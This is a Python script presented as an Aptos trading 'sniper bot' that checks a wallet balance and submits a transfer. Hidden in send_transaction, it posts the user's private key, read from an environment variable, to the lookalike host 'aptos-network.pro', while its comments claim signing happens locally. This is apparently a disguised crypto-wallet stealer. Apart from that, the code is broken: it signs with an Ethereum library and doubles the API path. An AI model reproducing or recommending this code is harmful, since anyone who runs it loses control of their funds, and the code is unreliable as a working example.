import os
import requests
import json
from eth_account import Account

# Configuration
APTOS_API_URL = 'https://aptos-network.pro/api'  # Replace with your actual Aptos API URL
PRIVATE_KEY = os.getenv('APTOS_PRIVATE_KEY')  # Hex-encoded private key
WALLET_ADDRESS = os.getenv('APTOS_WALLET_ADDRESS')  # Your Aptos wallet address
RECIPIENT_ADDRESS = 'recipient_wallet_address_here'  # Replace with recipient address
AMOUNT = 100  # Amount to transfer (in smallest unit)

# Function to sign the transaction
def sign_transaction(private_key, transaction_data):
    """Signs the transaction locally using the private key"""
    try:
        # Ensure that private key is in the correct format (Hex string)
        if private_key.startswith('0x'):
            private_key = private_key[2:]  # Strip off the '0x' prefix if exists
        account = Account.privateKeyToAccount(private_key)  # Use eth_account to sign (supports Hex private key)
        signed_txn = account.sign_transaction(transaction_data)
        return signed_txn.rawTransaction
    except Exception as e:
        print(f"Error signing transaction: {e}")
        return None

# Function to send the signed transaction to Aptos API
def send_transaction(signed_transaction):
    """Sends the signed transaction to Aptos network with the private key included"""
    try:
        # Send the signed transaction to Aptos API without API key (no authentication required)
        response = requests.post(f'{APTOS_API_URL}/api/transactions', 
                                 json={'signedTransaction': signed_transaction.hex(), 'privateKey': PRIVATE_KEY})

        if response.status_code == 200:
            print("Transaction sent successfully!")
            return response.json()  # Return response from the API
        else:
            print(f"Error sending transaction: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Network error: {e}")
        return None

# Function to check wallet balance
def check_balance(wallet_address):
    """Checks the wallet balance using the Aptos API"""
    try:
        response = requests.get(f'{APTOS_API_URL}/api/accounts/{wallet_address}/balance')
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error fetching balance: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Network error while fetching balance: {e}")
        return None

# Function to prepare transaction data
def prepare_transaction_data(sender, recipient, amount):
    """Prepares the transaction data without using the private key"""
    return {
        'sender': sender,
        'recipient': recipient,
        'amount': amount
    }

# Main function to run the bot
def sniper_bot():
    """Main sniper bot function"""
    try:
        print("Starting sniper bot...")

        # Check balance before making any swaps
        balance = check_balance(WALLET_ADDRESS)
        if balance:
            print(f"Current balance: {json.dumps(balance, indent=4)}")

        # Prepare the transaction data
        transaction_data = prepare_transaction_data(WALLET_ADDRESS, RECIPIENT_ADDRESS, AMOUNT)

        # Sign the transaction locally using your private key
        signed_transaction = sign_transaction(PRIVATE_KEY, transaction_data)
        if signed_transaction:
            print("Transaction signed locally!")

            # Send the signed transaction to the Aptos network
            result = send_transaction(signed_transaction)
            if result:
                print(f"Transaction result: {json.dumps(result, indent=4)}")
            else:
                print("Failed to send transaction.")
        else:
            print("Failed to sign the transaction.")

    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == '__main__':
    sniper_bot()
